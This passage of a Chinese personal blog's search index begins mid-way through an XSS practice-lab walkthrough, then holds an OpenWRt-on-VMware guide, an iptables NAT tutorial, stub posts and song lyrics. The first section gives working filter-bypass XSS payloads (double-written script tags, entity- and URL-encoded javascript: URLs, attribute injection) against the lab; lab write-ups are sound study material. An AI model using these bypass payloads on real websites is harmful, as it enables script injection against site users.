src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/23.png" alt="这里有一个图片"></p><p>看来后端这次是将input标签处的script替换为空字符，那可以通过双写绕过</p><p>&nbsp;</p><p>URL栏输入<code>&quot;&gt;&lt;scrscriptipt&gt;alert();&lt;/scrscriptipt&gt;&lt;img src=&quot;</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/24.png" alt="这里有一个图片"></p><p>过关</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>老样子，查看源码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/25.png" alt="1"></p><p>&nbsp;</p><p>老样子，测试下<code>&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;&lt;img src=&quot;</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/26.png" alt="这里有一个图片"></p><p>过不了</p><p>查看源码，这次后端在input标签将<code>&quot;、&lt;、&gt;</code>转换为HTML实体，而在a标签处只将<code>&quot;</code>转换为HTML实体，把<code>script</code>替换为<code>scr_ipt</code></p><p>&nbsp;</p><p>基于a标签，用Javascript伪协议和大小写绕过试试，<code>javascrIpt:alert();</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/27.png" alt="这里有一个图片"></p><p>看来对大小写做了防范</p><p>&nbsp;</p><p>那试试将<code>script</code>替换为对应的HTML实体</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/28.png" alt="1"></p><p><code>&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;</code></p><p><strong>如果在输入框输入</strong>，payload为<code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert();</code>，因为此时浏览器会对payload自动进行URL编码</p><p><strong>如果直接在URL栏输入</strong>，要在HTML实体编码后再进行一次URL编码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/29.png" alt="这里有一个图片"></p><p>此时payload为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B:alert();<br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/30.png" alt="这里有一个图片"></p><p>过关</p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>用上一关的payload试试</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/31.png" alt="这里有一个图片"></p><p>过不了，显示链接不合法，难道是会检查参数值里有没有javascript？最终查看网站源码，原来是检查有没有<code>http://</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/32.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>那直接在第八关的payload后面加上<code>var a =  %26%2334%3Bhttp://%26%2334%3B;</code></p><p>最终的payload如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B:alert();var a = %26%2334%3Bhttp://%26%2334%3B;<br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/33.png" alt="这里有一个图片"></p><p>过关</p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>查看源码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/34.png" alt="1"></p><p>三个隐藏的输入框，三个参数，那都添加在URL里</p><p>&nbsp;</p><p>在URL栏输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?t_link=<span class="hljs-string">&quot;&lt;script&gt;alert();&lt;/script&gt;&lt;input name=&quot;</span>abc&amp;t_history=<span class="hljs-string">&quot;&lt;script&gt;alert();&lt;/script&gt;&lt;input name=&quot;</span>abd&amp;t_sort=<span class="hljs-string">&quot;&lt;script&gt;alert();&lt;/script&gt;&lt;input name=&quot;</span>abe<br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/35.png" alt="这里有一个图片"></p><p>看来t_sort参数会有回显，但是后端将<code>&lt;、&gt;</code>替换为了空字符</p><p>&nbsp;</p><p>那输入<code>&quot; type=&quot;text&quot; autofocus oublur=alert(); ccc=&quot;</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/36.png" alt="这里有一个图片"></p><p>不知为啥这里调用不了alert</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OpenWRt防火墙详解</title>
    <link href="/2022/08/25/OpenWRt%E9%98%B2%E7%81%AB%E5%A2%99%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/08/25/OpenWRt%E9%98%B2%E7%81%AB%E5%A2%99%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>文章正在修改中…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>在VMWare Workstation上安装OpenWRt</title>
    <link href="/2022/08/20/%E5%9C%A8VMWare-Workstation%E4%B8%8A%E5%AE%89%E8%A3%85OpenWRt/"/>
    <url>/2022/08/20/%E5%9C%A8VMWare-Workstation%E4%B8%8A%E5%AE%89%E8%A3%85OpenWRt/</url>
    
    <content type="html"><![CDATA[<h2 id="一、下载OpenWRt镜像文件"><a href="#一、下载OpenWRt镜像文件" class="headerlink" title="一、下载OpenWRt镜像文件"></a>一、下载OpenWRt镜像文件</h2><p>1.OpenWRt下载地址</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//downloads.openwrt<span class="hljs-meta">.org</span>/releases/<br></code></pre></td></tr></table></figure><p>2.选择版本<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V1.png" alt="这里有一个图片"><br>这里我选择的是21.02.7<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V2.png" alt="这里有一个图片"></p><p>3.解压下载的压缩文件，得到镜像文件openwrt-21.02.7-x86-64-generic-ext4-combined-efi.img</p><h2 id="二、安装StarWindV2VConverter"><a href="#二、安装StarWindV2VConverter" class="headerlink" title="二、安装StarWindV2VConverter"></a>二、安装StarWindV2VConverter</h2><p>1.下载地址</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www.starwindsoftware.com/starwind-v2v-converter<span class="hljs-meta">#download</span><br></code></pre></td></tr></table></figure><h2 id="三、转换-img文件为-vmdk虚拟磁盘文件"><a href="#三、转换-img文件为-vmdk虚拟磁盘文件" class="headerlink" title="三、转换.img文件为.vmdk虚拟磁盘文件"></a>三、转换.img文件为.vmdk虚拟磁盘文件</h2><p>1.启动StarWindV2VConverter<br>2.源文件选择local file<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V3.png" alt="这里有一个图片"></p><p>3.目标文件同样选择local file<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V4.png" alt="这里有一个图片"></p><p>4.目标文件格式选择VMDK<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V5.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V6.png" alt="这里有一个图片"></p><p>5.最终生成.vmdk文件<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V7.png" alt="这里有一个图片"></p><h2 id="四、创建虚拟机"><a href="#四、创建虚拟机" class="headerlink" title="四、创建虚拟机"></a>四、创建虚拟机</h2><p>1.选择稍后安装操作系统<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V8.png" alt="这里有一个图片"></p><p>2.这里我选择的是其它linux 5.x内核64位<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V9.png" alt="这里有一个图片"></p><p>3.这里要特别注意，创建好和你选择的位置一致的目录，同时向目录中复制上一步生成的.vmdk文件<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V10.png" alt="这里有一个图片"><br>这时会弹出如下提示，这是因为VMWare检测到你选择的位置已经存在一个我们刚刚复制的.vmdk文件，我们点击继续<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V15.png" alt="这里有一个图片"></p><p>4.处理器和内存我选的是2核1G<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V11.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V12.png" alt="这里有一个图片"></p><p>5.暂时不使用网络连接<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V13.png" alt="这里有一个图片"></p><p>6.选择使用现有虚拟磁盘，然后选择第3步虚拟机位置里的.vmdk文件，我这里就是C:\VirtualMachines\OpenWRt5\openwrt-21.02.7-x86-64-generic-ext4-combined-efi.vmdk<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V14.png" alt="这里有一个图片"></p><p>7.这里可能会根据你使用的VMWare Workstation版本的不同弹出更新格式的提示，我选择的是保持现有格式<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V16.png" alt="这里有一个图片"></p><p>8.创建好虚拟机后，添加两个网卡适配器，可选择移除CD&#x2F;DVD、USB控制器、声卡、打印机，最终的设备列表如下图<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V17.png" alt="这里有一个图片"></p><h2 id="五、配置OpenWRt"><a href="#五、配置OpenWRt" class="headerlink" title="五、配置OpenWRt"></a>五、配置OpenWRt</h2><p>1.启动OpenWRt<br>2.编辑网络配置文件并重启</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">vim /etc/config/network<br></code></pre></td></tr></table></figure><p>这里我们只修改eth0(也就是添加的连接到VMNet12的网络适配器)的IP，然后输入reboot重启<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V18.png" alt="这里有一个图片"></p><p>重启后OpenWRt就能够从192.168.12.1(也就是win11物理机)访问，之后我们就可以在物理机上通过web接口对OpenWRt进行配置了<br>但要注意，要让物理机接入VMNet12<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V30.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V29.png" alt="这里有一个图片"></p><p>3.使用OpenWRt的web接口进行简单的后续配置<br>(1)初始密码为空<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V19.png" alt="这里有一个图片"><br>(2)点击导航栏的System-&gt;Administration设置密码<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V20.png" alt="这里有一个图片"><br>(3)点击导航栏的Network-&gt;Interfaces进行网络配置<br>下图是初始状态<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V21.png" alt="这里有一个图片"></p><p>因为我的VMNet8即NAT模式使用的是静态IP，同时我想要禁用IPv6，那我就要修改WAN interface、删除WAN6 interface<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V22.png" alt="这里有一个图片"></p><p>修改后的状态<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V23.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V24.png" alt="这里有一个图片"></p><p>(4)防火墙暂时就用默认配置<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V26.png" alt="这里有一个图片"></p><p>(5)更多关于OpenWRt的配置见文章(此处预留)</p><h2 id="六、简单测试"><a href="#六、简单测试" class="headerlink" title="六、简单测试"></a>六、简单测试</h2><p>1.将主机venus(192.168.12.21)的默认网关设置为192.168.12.23，即OpenWRt的Lan接口的IP<br>2.从venus PING kali1和223.5.5.5(阿里云的公共DNS)，可以PING通<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V25.png" alt="这里有一个图片"></p><p>3.从kali1 PING OpenWRt，PING不通<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V27.png" alt="这里有一个图片"><br>原因是防火墙默认配置的此处为reject<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/VMWare_OpenWRt/V28.png" alt="这里有一个图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>青城山下白素贞</title>
    <link href="/2022/08/11/%E9%9D%92%E5%9F%8E%E5%B1%B1%E4%B8%8B%E7%99%BD%E7%B4%A0%E8%B4%9E/"/>
    <url>/2022/08/11/%E9%9D%92%E5%9F%8E%E5%B1%B1%E4%B8%8B%E7%99%BD%E7%B4%A0%E8%B4%9E/</url>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1828793046&auto=1&height=66"></iframe><p>青城山下白素贞</p><p>洞中千年修此身</p><p>啊 啊</p><p>勤修苦练来得道</p><p>脱胎换骨变成人</p><p>啊 啊</p><p>一心向道无杂念</p><p>皈依三宝弃红尘</p><p>啊 啊</p><p>望求菩萨来点化</p><p>渡我素贞出凡尘</p><p>嗨呀嗨嗨哟</p><p>嗨呀嗨嗨哟</p><p>渡我素贞出凡尘</p><p>嗨呀嗨嗨哟</p><p>嗨呀嗨嗨哟</p><p>渡我素贞出凡尘</p><p>啊 啊</p><p>嗨呀嗨嗨哟</p><p>嗨呀嗨嗨哟</p><p>渡我素贞出凡尘</p><p>嗨呀嗨嗨哟</p><p>嗨呀嗨嗨哟</p><p>渡我素贞出凡尘</p><p>嗨呀嗨嗨哟</p><p>嗨呀嗨嗨哟</p><p>渡我素贞出凡尘</p><p>渡我素贞出凡尘</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>iptables的四表五链和内核的netfilter</title>
    <link href="/2022/07/20/iptables%E7%9A%84%E5%9B%9B%E8%A1%A8%E4%BA%94%E9%93%BE%E5%92%8C%E5%86%85%E6%A0%B8%E7%9A%84netfilter/"/>
    <url>/2022/07/20/iptables%E7%9A%84%E5%9B%9B%E8%A1%A8%E4%BA%94%E9%93%BE%E5%92%8C%E5%86%85%E6%A0%B8%E7%9A%84netfilter/</url>
    
    <content type="html"><![CDATA[<p>该文章修改中…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用iptables实现NAT</title>
    <link href="/2022/07/12/%E4%BD%BF%E7%94%A8iptables%E5%AE%9E%E7%8E%B0NAT/"/>
    <url>/2022/07/12/%E4%BD%BF%E7%94%A8iptables%E5%AE%9E%E7%8E%B0NAT/</url>
    
    <content type="html"><![CDATA[<h2 id="一、网络拓扑图"><a href="#一、网络拓扑图" class="headerlink" title="一、网络拓扑图"></a>一、网络拓扑图</h2><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/iptables_NAT/0.png" alt="这里有一个图片"><br>ubuntu版本为20.04<br>kali版本为2023.4</p><h2 id="二、预配置"><a href="#二、预配置" class="headerlink" title="二、预配置"></a>二、预配置</h2><p>1.在mercury上stop并disable ufw服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl stop ufw<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">disable</span> ufw<br></code></pre></td></tr></table></figure><p>2.在mercury上安装软件包iptables-persistent，启动netfilter-persistent服务，这样就可以使用命令iptables了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install iptables-persistent<br><span class="hljs-built_in">sudo</span> systemctl start iptables<br></code></pre></td></tr></table></figure><h2 id="三、仅开启linux内核的IP转发功能，不使用iptables进行NAT"><a href="#三、仅开启linux内核的IP转发功能，不使用iptables进行NAT" class="headerlink" title="三、仅开启linux内核的IP转发功能，不使用iptables进行NAT"></a>三、仅开启linux内核的IP转发功能，不使用iptables进行NAT</h2><p>1.在mercury上开启IP转发<br>(1)编辑文件&#x2F;etc&#x2F;sysctl.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/sysctl.conf<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;sysctl.conf 是一个配置文件，用于定义linux系统内核的各种参数。它允许你在系统启动时配置和调整内核参数，这些参数控制系统的行为，包括网络设置、内存管理、进程调度等</p><p>(2)取消注释或者在文件末尾添加如下行</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">net.ipv4.ip_forward</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/iptables_NAT/1.png" alt="这里有一个图片"></p><p>(3)使配置生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> sysctl -p<br></code></pre></td></tr></table></figure><p>2.在venus上PING kali1(192.168.163.138)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ping</span> <span class="hljs-number">192.168.163.138</span><br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/iptables_NAT/2.png" alt="这里有一个图片"><br>可以看到是PING不通的</p><p>3.在kali1上开启WireShark进行抓包并分析<br>(1)由下图可以看到，ICMP的request包的源IP为mercury而并非venus的IP，说明只进行了IP转发没有进行NAT<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/iptables_NAT/3.png" alt="这里有一个图片"></p><p>(2)而且由上图，kali1回复了ICMP的reply包，那为啥merury PING不通呢？<br>这是因为kali1上没有关于192.168.12.21的路由项，于是会将IP包发给默认网关192.168.163.2,所以mercury收不到ICMP reply包，也就是PING不通了</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/iptables_NAT/4.png" alt="这里有一个图片"></p><h2 id="四、使用iptables实现NAT"><a href="#四、使用iptables实现NAT" class="headerlink" title="四、使用iptables实现NAT"></a>四、使用iptables实现NAT</h2><p>1.在mercury上给iptables的nat表POSTROUTING链上增加一条规则</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">sudo iptables</span> <span class="hljs-literal">--</span><span class="hljs-comment">table nat</span> <span class="hljs-literal">--</span><span class="hljs-comment">append POSTROUTING</span> <span class="hljs-literal">--</span><span class="hljs-comment">out</span><span class="hljs-literal">-</span><span class="hljs-comment">interface ens34</span> <span class="hljs-literal">--</span><span class="hljs-comment">jump MASQUERADE</span><br></code></pre></td></tr></table></figure><p>这样，从内网要到外网的包的源IP地址就会被转换为venus的外网的接口ens34对应的IP 192.168.163.54</p><p>查看下nat表，看是否成功添加规则</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">sudo iptables</span> <span class="hljs-literal">--</span><span class="hljs-comment">table nat</span> <span class="hljs-literal">--</span><span class="hljs-comment">list</span><br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/iptables_NAT/5.png" alt="这里有一个图片"></p><p>2.此时我们再PING下kali1</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ping</span> <span class="hljs-number">192.168.163.138</span><br></code></pre></td></tr></table></figure><p>由下图可以看到，此时能够PING通kali1<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/iptables_NAT/6.png" alt="这里有一个图片"></p><p>3.再次在kali1上用WireShark进行抓包<br>可以看到，ICMP request包的源IP已经变成了192.168.163.54，说明成功实现了NAT<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/iptables_NAT/7.png" alt="这里有一个图片"></p><p>4.那为什么kali1回复的ICMP reply包到达了venus后，能顺利返回mercury呢？<br>这里应该是跟iptables是有状态防火墙、NAT映射表、conntrack相关，但具体原因因为个人水平太低还无法阐述</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>许嵩</title>
    <link href="/2022/04/12/%E8%AE%B8%E5%B5%A9/"/>
    <url>/2022/04/12/%E8%AE%B8%E5%B5%A9/</url>
    
    <content type="html"><![CDATA[<p>许嵩在我心目中是华语乐坛第一人，他作词作曲能力在华语乐坛我觉得是鹤立鸡群的存在<br>他每张专辑的作曲风格都不同，但都很好听很对我的胃口<br>而且他不只写情歌，太喜欢他了</p>]]></content>
    
    
    <categories>
      
      <category>想法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>玛丽_赵雷</title>
    <link href="/2022/03/23/%E7%8E%9B%E4%B8%BD-%E8%B5%B5%E9%9B%B7/"/>
    <url>/2022/03/23/%E7%8E%9B%E4%B8%BD-%E8%B5%B5%E9%9B%B7/</url>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=447925058&auto=1&height=66"></iframe><p>开头的伴奏一出来直接是直击灵魂，整体也很好听^_^</p><p>加油站旁的海鸥<br>机场路上的松柏<br>挥挥手眼泪就掉下来~</p><p>飘在黄昏的雪<br>覆盖了黑夜<br>我不能在清晨睁开眼~</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
